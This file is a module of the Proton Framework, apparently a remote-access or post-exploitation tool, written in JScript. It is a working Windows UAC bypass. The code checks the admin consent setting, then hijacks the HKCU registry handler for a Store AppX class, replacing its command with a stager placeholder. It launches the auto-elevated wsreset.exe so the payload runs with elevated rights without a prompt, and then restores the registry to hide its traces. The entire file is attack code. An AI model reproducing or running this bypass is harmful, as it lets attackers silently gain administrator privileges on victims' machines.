//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = proton.registry.read(proton.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", proton.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }

    var path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
    var delegate = proton.registry.read(proton.registry.HKCU, path, 'DelegateExecute', proton.registry.STRING).SValue;
    proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', '', proton.registry.STRING);
    proton.registry.write(proton.registry.HKCU, path, '', '~STAGER_DATA~', proton.registry.STRING);

    proton.shell.run("C:\\Windows\\System32\\wsreset.exe", false);

    proton.work.report("Completed");

    proton.registry.write(proton.registry.HKCU, path, 'DelegateExecute', delegate, proton.registry.STRING);
    proton.registry.write(proton.registry.HKCU, path, '', '', proton.registry.STRING);
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
